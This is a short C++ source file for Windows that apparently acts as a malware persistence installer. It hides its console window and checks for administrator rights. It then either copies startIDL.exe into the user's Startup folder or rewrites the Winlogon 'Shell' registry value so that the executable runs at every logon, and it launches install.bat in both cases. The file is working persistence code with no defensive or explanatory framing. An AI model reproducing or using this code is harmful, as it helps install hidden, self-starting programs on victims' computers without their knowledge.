#include <Windows.h>
#include "HAbilites.h"
#include "instRegCnt.h"
#include <iostream>

/*
remni eto ochen proshu
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]
*/

#define HAS_ADMINS_PERMS hAblities()

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    if (!HAS_ADMINS_PERMS) {
        system("start install.bat");
        system("copy files\\misc\\startIDL.exe %AppData%\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
    } else {
        SetCurrentValue((wchar_t*)L"explorer.exe, C:\\Bootstrap\\misc\\startIDL.exe", // Cast the string literal to wchar_t*
                     (wchar_t*)L"HKEY_LOCAL_MACHINE",
                     (wchar_t*)L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
                     (wchar_t*)L"Shell");

        system("start install.bat");
    }
}
